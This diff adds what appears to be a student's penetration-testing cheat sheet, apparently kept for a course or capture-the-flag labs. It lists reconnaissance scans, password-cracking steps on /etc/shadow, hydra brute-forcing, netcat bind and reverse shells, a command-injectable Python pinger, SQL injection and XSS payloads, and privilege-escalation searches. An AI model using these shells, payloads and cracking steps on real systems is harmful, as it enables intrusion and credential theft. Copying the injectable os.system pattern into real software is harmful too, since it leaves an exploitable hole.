@@ -1,1 +1,198 @@
-hello
+Playbook command list
+
+Intel gathering
+
+Nslookup-
+nslookup [site]
+
+Nmap -
+Nmap -sV [IP] 
+Nmap -sV [IP] -T5 -p-
+Nmap -A [IP] 
+
+Nitko -
+nikto -h [IP / web address]
+
+Wpscan (WordPress sites)
+wpscan –url
+
+Web scanning
+gobuster dir -u [ip/url] -w [path to wordlist] 
+
+SQL injection
+[web address] /?rest_route=/wpgmza/v1/
+markers&filter={}&fields=*from 
+[table name] – -
+
+All tables 
+information_schema.tables
+
+File searching
+
+find / -name *.sql
+find / -name "*.[filetype]" 2>/dev/null
+find [path] -name “[filename]” 2>/dev/null
+ 
+Password cracking
+
+Needs root
+1)
+sudo unshadow /etc/passwd 
+/etc/shadow > unshadow.txt
+
+2)
+john -w=wordlist.txt unshadow.txt -format=crypt
+
+Without root 
+
+hashcat -m [hashtype] -a [attack mode] hash.txt /path/to/wordlist.txt
+(word press uses md5, 400 in hashcat)
+Use man hashcat to find []
+
+Hydra
+hydra -l [username] -P [wordlist] -s [port number if using non standard port] [target] [service]
+
+-l or -p for single input
+-L or -P for wordlist
+Bold is optional 
+
+Hash-id
+sudo apt install hashid
+hashid -m [hash] (lists possible hash list)
+
+Command Shell injection
+sudo vi IP-pinger.py
+
+## code
+import os
+import sys
+# Unsafe command execution
+address = sys.argv[1]
+response = os.system("ping -c 4 " + address)
+
+python3 IP-pinger.py 8.8.8.8 && [command]
+
+Or at injection point
+
+[command] && [command]
+
+Shells ((S)ever / (A)ttack machine)
+
+Bind (use nc if ncat broke)
+S- ncat -lvnp 4444 -e /bin/bash
+A- ncat [my IP] 4444
+
+Reverse
+A - nc -lvnp 4443
+S- nc [my IP] 4443 -e /bin/bash
+
+Spawn bin/bash
+python(3) -c 'import pty; pty.spawn("/bin/bash")'
+
+3 if using python 3
+
+Kernel version 
+uname -a 
+lsb_release -a ## more accurate
+
+Shell payload 
+echo “nc [my IP] 4443 -e /bin/bash” > exploit.run
+
+nc -lvnp 4443
+
+Metasploit 
+msfconsole 
+search [exploit]
+Use [option]
+set [option] [input] 
+exploit (runs exploit)
+
+
+Command Injection
+
+All different ways to read a file:
+Grep . [filename]
+Less [filename]
+Tac [filename]
+Nano [filename]
+XSS
+test
+<script>alert()</script>
+
+Funny thing writes files
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
+
+User list when you have shell (may not work)
+awk -F: '{ print $1}' /etc/passwd
+
+word press
+wpscan --url [url] --enumerate u  (gets users)
+
+wpscan --url --usernames [usernames] --passwords [wordlist] (brute force logins)
+
+wordpress sites that spill info
+http://[ip/url]/wordpress/?rest_route=/wp/v2/users
+
+Abuse permissions
+
+this could be useful to cat files I have no access to 
+cp /etc/shadow /dev/stdout
+
+sudo -l (what you can run as root)
+
+https://gtfobins.github.io
+
+see what runs with privileges
+find / -perm -u=s -type f 2>/dev/null
+or
+find / -perm /u=s,g=s 2>/dev/null
+
+Base64
+cat [txt or string] | base64 -d
+Or 
+base64 -d encoded.txt > decoded.txt
+
+
+Chmod 
+chmod 777 - full perms 
+d = directory
+r = read
+w = write
+x = execute
+Owner| group| others
+Drwx    rwx     rwx
+https://quickref.me/chmod.html
+7 rwx 111
+6 rw- 110
+5 r-x 101
+4 r– 100
+3 -wx 011
+2 -w- 010
+1 –x 001
+0 — 000
+
+
+
+SSH
+
+
+
+Geolocation 	
+
+
+	
+Some good websites/searches if allowed
+PayloadsAllTheThings for reverse shells
+
+https://snapcraft.io/install/hash-id/ubuntu
+This is a tool that identifies hash types
+
+Guest lecture
+
+SQL
+‘ or 1=1--
+
+Broken access controls
+Change parameters to fetch data
+Change GET command id = [new input]
+
